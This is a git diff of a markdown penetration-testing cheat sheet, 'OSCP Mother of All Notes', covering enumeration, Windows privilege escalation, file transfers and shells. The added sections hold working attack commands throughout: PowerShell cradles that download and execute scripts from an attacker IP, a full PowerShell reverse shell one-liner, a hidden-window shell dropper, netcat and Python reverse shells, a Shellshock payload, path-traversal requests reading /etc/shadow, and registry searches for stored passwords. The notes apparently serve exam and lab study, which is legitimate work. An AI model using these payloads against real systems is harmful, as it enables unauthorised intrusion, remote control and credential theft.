@@ -1,5 +1,94 @@
 # OSCP Mother of All Notes
-
+- [OSCP Mother of All Notes](#oscp-mother-of-all-notes)
+  - [Kali Linux](#kali-linux)
+  - [Information Gathering & Vulnerability Scanning](#information-gathering--vulnerability-scanning)
+    - [Passive Information Gathering](#passive-information-gathering)
+    - [Active Information Gathering](#active-information-gathering)
+      - [Port Scanning](#port-scanning)
+  - [Enumeration](#enumeration)
+    - [DNS Enumeration](#dns-enumeration)
+    - [NFS (Network File System) Enumeration](#nfs-network-file-system-enumeration)
+    - [SMB Enumeration](#smb-enumeration)
+    - [SMTP Enumeration - Mail Severs](#smtp-enumeration---mail-severs)
+    - [SNMP Enumeration -Simple Network Management Protocol](#snmp-enumeration--simple-network-management-protocol)
+    - [MS SQL Server Enumeration ( xp_cmdshell to execute commands )](#ms-sql-server-enumeration--xp_cmdshell-to-execute-commands-)
+    - [Linux OS Enumeration ( LinEnum.sh, linuxprivchecker.py, linux exploit suggester )](#linux-os-enumeration--linenumsh-linuxprivcheckerpy-linux-exploit-suggester-)
+    - [Windows OS Enumeration](#windows-os-enumeration)
+      - [Automated Windows Enumeration Scripts](#automated-windows-enumeration-scripts)
+        - [Running Windows Privesc Check (windows-privesc-check)](#running-windows-privesc-check-windows-privesc-check)
+        - [Running Sherlock](#running-sherlock)
+        - [Running Watson](#running-watson)
+        - [Running JAWS - Just Another Windows (Enum) Script](#running-jaws---just-another-windows-enum-script)
+        - [CopyAndPasteEnum.bat](#copyandpasteenumbat)
+        - [CopyAndPasteFileDownloader.bat](#copyandpastefiledownloaderbat)
+        - [windows_recon.bat](#windows_reconbat)
+  - [File Enumeration](#file-enumeration)
+  - [HTTP Enumeration ( Always search for .txt,php,asp,aspx files )](#http-enumeration--always-search-for-txtphpaspaspx-files-)
+  - [Buffer Overflow](#buffer-overflow)
+    - [Nmap Fuzzers](#nmap-fuzzers)
+    - [Windows Buffer Overflows](#windows-buffer-overflows)
+  - [Shells](#shells)
+    - [Execute a remote shell dropper](#execute-a-remote-shell-dropper)
+    - [Creating a fast TCP/UDP tunnel transported over HTTP secured via SSH with CHISEL](#creating-a-fast-tcpudp-tunnel-transported-over-http-secured-via-ssh-with-chisel)
+    - [Upgrading your Windows Shell](#upgrading-your-windows-shell)
+      - [Netcat Reverseshell Oneliners for Windows](#netcat-reverseshell-oneliners-for-windows)
+      - [Upgrade Windows Command Line with a Powershell One-liner Reverse Shell](#upgrade-windows-command-line-with-a-powershell-one-liner-reverse-shell)
+      - [Upgrade Shell with PowerShell Nishang](#upgrade-shell-with-powershell-nishang)
+  - [File Transfers](#file-transfers)
+    - [Uploading Files](#uploading-files)
+      - [Uploading Files with VBScript](#uploading-files-with-vbscript)
+      - [Uploading Files with CertUtil.exe](#uploading-files-with-certutilexe)
+      - [Transfering Files using MSHTA](#transfering-files-using-mshta)
+      - [Trasfering Files using Bitsadmin](#trasfering-files-using-bitsadmin)
+      - [Uploading Files with PowerShell](#uploading-files-with-powershell)
+      - [Uploading Files with Python](#uploading-files-with-python)
+      - [Uploading Files with Perl](#uploading-files-with-perl)
+      - [Uploading Files with curl](#uploading-files-with-curl)
+      - [Uploading Files with FTP](#uploading-files-with-ftp)
+      - [Transfering Files via SMB using Impacket](#transfering-files-via-smb-using-impacket)
+    - [Packing Files](#packing-files)
+  - [Linux Privilege Escalation](#linux-privilege-escalation)
+  - [Windows Privilege Escalation](#windows-privilege-escalation)
+    - [Sysinternals](#sysinternals)
+    - [Windows Run As](#windows-run-as)
+    - [PowerShell](#powershell)
+    - [Others](#others)
+    - [Windows Kernel Exploit (MS16-032)](#windows-kernel-exploit-ms16-032)
+    - [Potato Attacks](#potato-attacks)
+      - [RottenPotato](#rottenpotato)
+      - [Juicy Potato](#juicy-potato)
+    - [Fireeye Session Gopher](#fireeye-session-gopher)
+    - [Running Mimikatz](#running-mimikatz)
+      - [Running traditional (binary) Mimikatz](#running-traditional-binary-mimikatz)
+      - [Running Powershell Mimikatz](#running-powershell-mimikatz)
+    - [Capture a screen shot](#capture-a-screen-shot)
+  - [Client, Web and Password Attacks](#client-web-and-password-attacks)
+    - [Client Attacks](#client-attacks)
+    - [Web Attacks](#web-attacks)
+  - [File Inclusion Vulnerabilities](#file-inclusion-vulnerabilities)
+    - [Database Vulnerabilities](#database-vulnerabilities)
+  - [Networking, Pivoting and Tunneling](#networking-pivoting-and-tunneling)
+  - [The Metasploit Framework](#the-metasploit-framework)
+  - [Bypassing Antivirus Software](#bypassing-antivirus-software)
+  - [Windows Commands for Linux Users](#windows-commands-for-linux-users)
+    - [WAF - Web application firewall](#waf---web-application-firewall)
+    - [Common web-services](#common-web-services)
+  - [Loot Windows](#loot-windows)
+    - [Meterpreter](#meterpreter)
+    - [Dumping passwords and hashes on windows](#dumping-passwords-and-hashes-on-windows)
+      - [LM Hashes](#lm-hashes)
+    - [Windows Credencial Editor (WCE)](#windows-credencial-editor-wce)
+    - [VNC](#vnc)
+  - [Tcp-dump on windows](#tcp-dump-on-windows)
+    - [Meterpreter](#meterpreter-1)
+  - [Recursive search](#recursive-search)
+  - [Loot Linux](#loot-linux)
+  - [Generate custom wordlist](#generate-custom-wordlist)
+    - [Password rules](#password-rules)
+  - [Windows Pre-Compiled Binaries](#windows-pre-compiled-binaries)
+  - [Active Directory and/or LDAP](#active-directory-andor-ldap)
+    - [Username fuzzing in ldap](#username-fuzzing-in-ldap)
+    - [Password enumeration against ldap](#password-enumeration-against-ldap)
 ## Kali Linux
 
 - Set the Target IP Address to the `$ip` system variable  
@@ -228,45 +317,30 @@ help
 
 - NMAP DNS Hostnames Lookup
       `nmap -F --dns-server <dns server ip> <target ip range>`
-
 - Host Lookup  
       `host -t ns megacorpone.com`
-
 - Reverse Lookup Brute Force - find domains in the same range ( This can be done when you have a domain and found a range of ips, you will do this in the intermediary portion of those ips )  
       `for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"`
-
 - Perform DNS IP Lookup  
       `dig a domain-name-here.com @nameserver`
-
 - Perform MX Record Lookup  
       `dig mx domain-name-here.com @nameserver`
-
 - Perform Zone Transfer with DIG  
       `dig axfr domain-name-here.com @nameserver`
-
 - DNS Zone Transfers  
-      Windows DNS zone transfer  
-
+  - Windows DNS zone transfer  
       `nslookup -> set type=any -> ls -d blah.com`
-
-      Linux DNS zone transfer  
-
+  - Linux DNS zone transfer  
       `dig axfr blah.com @ns1.blah.com`
-
 - Dnsrecon DNS Brute Force  
       `dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml`
-
 - Dnsrecon DNS List of megacorp  
       `dnsrecon -d megacorpone.com -t axfr`
-
 - DNSEnum  
       `dnsenum zonetransfer.me`
-
 - NMap Enumeration Script List:
-
 - NMap Discovery  
       [*https://nmap.org/nsedoc/categories/discovery.html*](https://nmap.org/nsedoc/categories/discovery.html)
-
 - Nmap port version detection MAXIMUM power  
       `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>`
 
@@ -392,27 +466,18 @@ help
       `echo "" > /etc/snmp/snmp.conf`
 
 - SNMP Enumeration Commands
-
   - `snmpcheck -t $ip -c public`
-
   - `snmpwalk -c public -v1 $ip 1|`
-
   - `grep hrSWRunName|cut -d\* \* -f`
-
   - `snmpenum -t $ip`
-
   - `onesixtyone -c names -i hosts`
-
 - SNMPv3 Enumeration  
-      `nmap -sV -p 161 --script=snmp-info $ip/24`
-
+  - `nmap -sV -p 161 --script=snmp-info $ip/24`
 - Automate the username enumeration process for SNMPv3:  
       `apt-get install snmp snmp-mibs-downloader`
       `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`
-
 - SNMP Default Credentials  
       /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
-
 ### MS SQL Server Enumeration ( xp_cmdshell to execute commands )
 
 - Nmap Information Gathering
@@ -420,32 +485,24 @@ help
       `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip`
 
 - Webmin and miniserv/0.01 Enumeration - Port 10000
-
-    Test for LFI & file disclosure vulnerability by grabbing /etc/passwd
-
+  - Test for LFI & file disclosure vulnerability by grabbing /etc/passwd
       `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`
 
-    Test to see if webmin is running as root by grabbing /etc/shadow
-
+  - Test to see if webmin is running as root by grabbing /etc/shadow
       `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`
 
 ### Linux OS Enumeration ( LinEnum.sh, linuxprivchecker.py, linux exploit suggester )
 
 - List all SUID files  
       `find / -perm -4000 2>/dev/null`
-
 - Determine the current version of Linux  
       `cat /etc/issue`
-
 - Determine more information about the environment  
       `uname -a`
-
 - List processes running  
       `ps -xaf`
-
 - List the allowed (and forbidden) commands for the invoking use  
       `sudo -l`
-
 - List iptables rules  
       `iptables --table nat --list  
       iptables -vL -t filter  
@@ -456,82 +513,343 @@ help
 
 ### Windows OS Enumeration
 
-- net config Workstation
+_NOTE_ There are many executables that could provide privledge escalation if they are being run by a privledged user, most can be found on the incredible LOLBAS project: <https://lolbas-project.github.io/>
 
-- systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-
-- hostname
-
-- net users
-
-- ipconfig /all
-
-- route print
-
-- arp -A
-
-- netstat -ano
-
-- netsh firewall show state
-
-- netsh firewall show config
-
-- schtasks /query /fo LIST /v
-
-- tasklist /SVC
-
-- net start
-
-- DRIVERQUERY
-
-- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
-
-- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
-
-- dir /s *pass* == *cred* == *vnc* == *.config*
-
-- findstr /si password *.xml*.ini *.txt
-
-- reg query HKLM /f password /t REG_SZ /s
-
-- reg query HKCU /f password /t REG_SZ /s
-
-- Vulnerability Scanning with Nmap
-
-- Nmap Exploit Scripts  
+- `net config Workstation`
+- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
+- `hostname`
+- `net users`
+- `net user <username>`
+- `net config Workstation`
+- `ipconfig /all`
+- `route print`
+- `arp -A`
+- `netstat -ano`
+- `netsh firewall show state`
+- `netsh firewall show config`
+- `schtasks /query /fo LIST /v`
+- `tasklist /SVC`
+- `net start`
+- `DRIVERQUERY`
+- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
+- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
+- `dir /s *pass* == *cred* == *vnc* == *.config*`
+- `findstr /si password *.xml*.ini *.txt`
+- `reg query HKLM /f password /t REG_SZ /s`
+- `reg query HKCU /f password /t REG_SZ /s`
+- `Vulnerability Scanning with Nmap`
+- What is running on the machine? If we are able to run WMIC we can pull rich details on the services and applications running:
+  ```txt
+  wmic service list full > services.txt
+  wmic process > processes.txt
+  ```
+- Or alternatively: `tasklist > processes.txt`
+- Has a Windows Auto-login Password been set?
+      `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
+- Dump a tree of all the folders / files on the HDD
+      `tree c:\ > c:\users\public\folders.txt`
+- Or for a list of files: `dir /s c:\ > c:\users\public\files.txt`
+- Nmap Exploit Scripts
   [*https://nmap.org/nsedoc/categories/exploit.html*](https://nmap.org/nsedoc/categories/exploit.html)
-
 - Nmap search through vulnerability scripts  
-  `cd /usr/share/nmap/scripts/  
-  ls -l \*vuln\*`
+  ```
+  cd /usr/share/nmap/scripts/  
+  ls -l \*vuln\*
+  ```
 
 - Nmap search through Nmap Scripts for a specific keyword  
   `ls /usr/share/nmap/scripts/\* | grep ftp`
-
 - Scan for vulnerable exploits with nmap  
   `nmap --script exploit -Pn $ip`
-
 - NMap Auth Scripts  
   [*https://nmap.org/nsedoc/categories/auth.html*](https://nmap.org/nsedoc/categories/auth.html)
-
 - Nmap Vuln Scanning  
   [*https://nmap.org/nsedoc/categories/vuln.html*](https://nmap.org/nsedoc/categories/vuln.html)
-
 - NMap DOS Scanning  
-  `nmap --script dos -Pn $ip  
+
+  ```
+  nmap --script dos -Pn $ip  
   NMap Execute DOS Attack  
   nmap --max-parallelism 750 -Pn --script http-slowloris --script-args
-  http-slowloris.runforever=true`
-
+  http-slowloris.runforever=true
+  ```
 - Scan for coldfusion web vulnerabilities  
   `nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip`
-
 - Anonymous FTP dump with Nmap  
   `nmap -v -p 21 --script=ftp-anon.nse $ip-254`
-
 - SMB Security mode scan with Nmap  
   `nmap -v -p 21 --script=ftp-anon.nse $ip-254`
 
+#### Automated Windows Enumeration Scripts
+
+We are also going to look a a few automated methods of performing Windows Enumeration including:
+
+- WindownPrivEsc.exe
+- Sherlock
+- Watson
+- JAWZ
+- Seatbelt
+
+##### Running Windows Privesc Check (windows-privesc-check)
+
+The Windows Privesc Check is a very powerful tool for finding common misconfigurations in a Windows system that could lead to privledge escalation. It has not been updated for a while, but it is still as effective today as it was 5 years ago. The downside of this script is that it was written in Python and if the target system does not have Python installed, you will need to use an executable version that has a Python interpreter built in. Having to include Python in the package makes the executable version is pretty large, coming in at a whopping 7.14 MB!!
+
+- First we will need to clone the latest version to our environment:
+
+```bash
+root@kali:~/tools# git clone https://github.com/pentestmonkey/windows-privesc-check
+Cloning into 'windows-privesc-check'...
+remote: Enumerating objects: 1232, done.
+remote: Total 1232 (delta 0), reused 0 (delta 0), pack-reused 1232
+Receiving objects: 100% (1232/1232), 34.79 MiB | 4.61 MiB/s, done.
+Resolving deltas: 100% (897/897), done.
+```
+
+- Next we will need to setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from:
+
+```bash
+root@kali:~/tools# cd windows-privesc-check/
+root@kali:~/tools/windows-privesc-check# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+- Now we will need to transfer the file to our remote windows box:
+
+`@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/windows-privesc-check2.exe\", \"C:\\Users\\Public\\Downloads\\windows-privesc-check2.exe\");`
+
+And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
+
+```CMD
+C:\Users\Admin>cd ..
+C:\Users>cd Public
+C:\Users\Public>cd Downloads
+C:\Users\Public\Downloads>windows-privesc-check2.exe --audit -a -o report
+windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)...
+```
+
+The windows-privesc-check will create a detailed HTML report and text based report for your review.
+
+##### Running Sherlock
+
+Sherlock is a powershell library with a number of privledge escalation checkers built in. We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD.
+
+```bash
+root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git
+Cloning into 'Sherlock'...
+remote: Enumerating objects: 3, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Compressing objects: 100% (3/3), done.
+remote: Total 75 (delta 0), reused 2 (delta 0), pack-reused 72
+Unpacking objects: 100% (75/75), done.
+root@kali:~test# cd Sherlock/
+root@kali:~test/Sherlock# ls
+LICENSE  README.md  Sherlock.ps1
+root@kali:~test/Sherlock# echo Find-AllVulns >> Sherlock.ps1
+root@kali:~test/Sherlock# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+Now we can run this from the remote Windows CMD shell:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1'))"`
+
+- Or from a Windows Powershell:
+  `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')`
+
+##### Running Watson
+
+Sherlock has been superceded by a .net Windows enumeration platform called Watson which is frequently updated by the author. It is a bit tricker to deploy and use as you need to compile it yourself and match the version of .net with the target system's version.
+
+First, on the target system we will need to check the versions of .Net that have been installed by navigating to the .net framework folder and poking around:
+
+```CMD
+cd \Windows\Microsoft.NET\Framework\
+dir /s msbuild
+```
+
+Only active versions of .NET will have the msbuild.exe. Make note of the available versions and leverage that to compile your version of Watson that targets the remote Windows machine. Download the latest version of Watson from github:
+
+  `git clone https://github.com/rasta-mouse/Watson.git`
+
+And open it using Visual Studio. In the Solution Explorer, click the Properties and modify the "Target Framework:" value to align with the remote Windows machine's version of the .Net framework. It will prompt you to reopen the project. Once the project has reloaded, Build the project under the Release mode (CTRL + SHIFT + B).
+
+Next we will copy our Watson.exe to our Kali instance and setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from:
+
+```bash
+root@kali:~/tools# cd Watson/
+root@kali:~/tools/Watson# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+Now we will need to transfer the compiled Watson.exe file to our remote windows box:
+
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/Watson.exe\", \"C:\\Users\\Public\\Downloads\\Watson.exe\");`
+
+And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
+
+```CMD
+C:\Users\Admin>cd ..
+C:\Users>cd Public
+C:\Users\Public>cd Downloads
+C:\Users\Public\Downloads>Watson.exe
+```
+
+##### Running JAWS - Just Another Windows (Enum) Script
+
+JAWS is another powershell library that was built with privledge escalation of the OSCP lab machines in mind. We can stage and run JAWS on a remote http server so the file never needs to hit the remote server's HDD.
+  `git clone https://github.com/411Hall/JAWS`
+
+- Now we can run this from the remote Windows CMD shell:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/jaws-enum.ps1'))"`
+- Or from a Windows Powershell:
+  `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/jaws-enum.ps1')`
+
+And we should see the following output start to appear:
+```CMD
+Running J.A.W.S. Enumeration
+        - Gathering User Information
+        - Gathering Processes, Services and Scheduled Tasks
+        - Gathering Installed Software
+```
+
+##### CopyAndPasteEnum.bat
+
+No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial). Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report:
+
+      ```bat
+      echo Windows Privilege Escalation Report - Copy and Paste Version (No file upload required) - Copy and Paste this script into your reverse shell console to create a simple report file.
+      @echo --------- BASIC WINDOWS RECON ---------  > report.txt
+      timeout 1
+      net config Workstation  >> report.txt
+      timeout 1
+      systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
+      timeout 1
+      hostname >> report.txt
+      timeout 1
+      net users >> report.txt
+      timeout 1
+      ipconfig /all >> report.txt
+      timeout 1
+      route print >> report.txt
+      timeout 1
+      arp -A >> report.txt
+      timeout 1
+      netstat -ano >> report.txt
+      timeout 1
+      netsh firewall show state >> report.txt	
+      timeout 1
+      netsh firewall show config >> report.txt
+      timeout 1
+      schtasks /query /fo LIST /v >> report.txt
+      timeout 1
+      tasklist /SVC >> report.txt
+      timeout 1
+      net start >> report.txt
+      timeout 1
+      DRIVERQUERY >> report.txt
+      timeout 1
+      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+      timeout 1
+      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+      timeout 1
+      dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
+      timeout 1
+      findstr /si password *.xml *.ini *.txt >> report.txt
+      timeout 1
+      reg query HKLM /f password /t REG_SZ /s >> report.txt
+      timeout 1
+      reg query HKCU /f password /t REG_SZ /s >> report.txt 
+      timeout 1
+      dir "C:\"
+      timeout 1
+      dir "C:\Program Files\" >> report.txt
+      timeout 1
+      dir "C:\Program Files (x86)\"
+      timeout 1
+      dir "C:\Users\"
+      timeout 1
+      dir "C:\Users\Public\"
+      timeout 1
+      echo REPORT COMPLETE!
+      ```
+
+##### CopyAndPasteFileDownloader.bat
+
+Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line)
+
+      ```bat
+      echo Set args = Wscript.Arguments  > webdl.vbs
+      timeout 1
+      echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
+      timeout 1
+      echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
+      timeout 1
+      echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
+      timeout 1
+      echo xHttp.Open "GET", Url, False  >> webdl.vbs
+      timeout 1
+      echo xHttp.Send  >> webdl.vbs
+      timeout 1
+      echo with bStrm      >> webdl.vbs
+      timeout 1
+      echo 	.type = 1 '      >> webdl.vbs
+      timeout 1
+      echo 	.open      >> webdl.vbs
+      timeout 1
+      echo 	.write xHttp.responseBody      >> webdl.vbs
+      timeout 1
+      echo 	.savetofile "C:\users\public\windows-privesc-check2.exe", 2 '  >> webdl.vbs
+      timeout 1
+      echo end with >> webdl.vbs
+      timeout 1
+      echo
+      ```
+The file can be run using the following syntax:
+      `C:\temp\cscript.exe webdl.vbs`
+
+##### windows_recon.bat
+
+An uploadable batch file for performing basic windows enumeration.
+
+      ```bat
+      echo --------- net config Workstation ---------  > report.txt
+      net config Workstation  >> report.txt
+      systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
+      hostname >> report.txt
+      net users >> report.txt
+      ipconfig /all >> report.txt
+      route print >> report.txt
+      arp -A >> report.txt
+      netstat -ano >> report.txt
+      netsh firewall show state >> report.txt	
+      netsh firewall show config >> report.txt
+      schtasks /query /fo LIST /v >> report.txt
+      tasklist /SVC >> report.txt
+      net start >> report.txt
+      DRIVERQUERY >> report.txt
+      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+      dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
+      findstr /si password *.xml *.ini *.txt >> report.txt
+      reg query HKLM /f password /t REG_SZ /s >> report.txt
+      reg query HKCU /f password /t REG_SZ /s >> report.txt
+
+      sc qc Spooler >> report.txt
+      accesschk.exe -ucqv Spooler >> report.txt
+      ```
+- References:
+  - [https://medium.com/@hakluke](mailto:https://medium.com/@hakluke)
+  - <https://daya.blog/2018/01/06/windows-privilege-escalation/>
+  - <https://pentestlab.blog/2017/04/19/stored-credentials/>
+  - <https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/>
+  - <https://www.abatchy.com/>
+  - <https://gist.github.com/egre55>
+  - <https://github.com/egre55/ultimate-file-transfer-list>
+  - <https://lolbas-project.github.io/>
+  - <https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/>
+  - <https://github.com/GhostPack/Seatbelt>
+  - <https://github.com/rasta-mouse/Watson>
+  - <http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html>
+  - <https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb>
 ## File Enumeration
 
 - Find UID 0 files root execution
@@ -713,23 +1031,22 @@ help
     `nc -nlvp 4444`
 
 - Spawning a TTY Shell - Break out of Jail or limited shell
-         You should almost always upgrade your shell after taking control of an apache or www user.
+      You should almost always upgrade your shell after taking control of an apache or www user.
+      (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
+      (hint: sudo -l to see what you can run)
 
-        (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
-        
-        (hint: sudo -l to see what you can run)
-
-  - You may encounter limited shells that use rbash and only allow you to execute a single command per session.
-         You can overcome this by executing an SSH shell to your localhost:
-
-               ssh user@$ip nc $localip 4444 -e /bin/sh
-               enter user's password
-               python -c 'import pty; pty.spawn("/bin/sh")'
-               export TERM=linux
+- You may encounter limited shells that use rbash and only allow you to execute a single command per session.
+      You can overcome this by executing an SSH shell to your localhost:
+      ```shell
+      ssh user@$ip nc $localip 4444 -e /bin/sh
+      enter user's password
+      python -c 'import pty; pty.spawn("/bin/sh")'
+      export TERM=linux
+      ```
 
       `python -c 'import pty; pty.spawn("/bin/sh")'`
 
-               python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);          s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
+      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'`
 
       `echo os.system('/bin/bash')`
 
@@ -905,8 +1222,58 @@ help
 
              echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
 
-- Nishang
-      **For this to work, you should have an exploit that can run remote command execution**
+### Execute a remote shell dropper
+
+Often, you can leverage PowerShell to execute a remotely hosted powershell script which contains a shell dropper (generated by the platform of your choosing).
+  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden -NonInteractive -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
+
+There are also some no-so-well documented PowerShell argument shortcuts so can use things like -w rather than -WindowsStyle (handy for smaller payloads):
+  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
+
+### Creating a fast TCP/UDP tunnel transported over HTTP secured via SSH with CHISEL
+
+Download the appropriate OS binaries from the release folder of the chisel [on here](https://github.com/jpillora/chisel): 
+`mv ~/Downloads/chisel_1.7.6_windows_amd64.gz .`
+
+- Unzip the files with gunzip:
+  - `gunzip -d chisel_1.7.6_windows_amd64.gz` & then make it executable `mv chisel_1.7.6_windows_amd64 chisel.exe`
+  - `gunzip -d chisel_1.7.6_linux_amd64.gz` & then make it executable by `mv chisel_1.7.6_linux_amd64 chisel` & `chmod +x chisel`
+- Then on the attacker machine run the chisel server:
+  `./chisel server --reverse --port 9002`
+- Send the client one to the host/victim machine via curl/curtutil/ftp/netcat or whatever mechanism you have and then execute the following. Have that in mind below maps port 3306 to localhost in reverse and also we mapped the second one 8888 just in case.
+  `.\chisel.exe client 10.10.14.23:9002 R:3306:localhost:3306 R:8888:localhost:8888`
+
+### Upgrading your Windows Shell
+
+You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:
+#### Netcat Reverseshell Oneliners for Windows
+
+Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell. If you have transfered the shell to victim box, execute:
+  `nc.exe 10.10.14.23 9001 -e powershell`
+#### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell
+
+You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
+
+`CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"`
+
+#### Upgrade Shell with PowerShell Nishang
+
+Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests:
+**For this to work, you should have an exploit that can run remote command execution**
+
+      ```bash
+      root@kali:~/test# git clone https://github.com/samratashok/nishang.git                                                  
+      Cloning into 'nishang'...
+      remote: Enumerating objects: 1612, done.
+      remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612
